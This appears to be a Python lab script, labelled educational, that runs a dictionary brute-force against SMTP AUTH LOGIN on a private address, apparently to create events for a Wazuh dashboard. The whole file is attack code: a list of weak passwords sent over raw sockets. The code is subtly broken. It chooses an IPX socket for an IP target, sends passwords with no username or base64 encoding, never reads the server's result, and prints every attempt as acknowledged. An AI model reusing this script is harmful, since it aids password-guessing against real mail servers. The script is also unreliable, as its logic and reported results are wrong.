# Educational Simulation Tool: Automated SSH/MTA Validation Login Tester
# For deployment validation inside the ProjectSecurity E101 Lab Network ONLY.

import socket
import sys

TARGET_IP = "10.0.0.15"  # Ubuntu MailHog Server Static IP
PORT = 25  # SMTP Target Port
PASS_LIST = ["password", "123456", "admin", "projectx2025", "security"]

print(f"[*] Starting simulated SMTP dictionary brute-force validation against {TARGET_IP}...")

for password in PASS_LIST:
    try:
        s = socket.socket(socket.AF_IPX if hasattr(socket, 'AF_IPX') else socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, PORT))
        banner = s.recv(1024)
        
        # Simulating AUTH LOGIN command sequence
        s.send(b"AUTH LOGIN\r\n")
        response = s.recv(1024)
        
        # Injection of trial payload
        s.send(f"{password}\r\n".encode())
        result = s.recv(1024)
        
        print(f"[Attempt] Testing baseline string: '{password}' -> Connection acknowledged.")
        s.close()
    except Exception as e:
        print(f"[-] Execution issue encountered: {e}")
        sys.exit()

print("[*] Attack simulation completed. Review Wazuh dashboard for ingestion verification.")
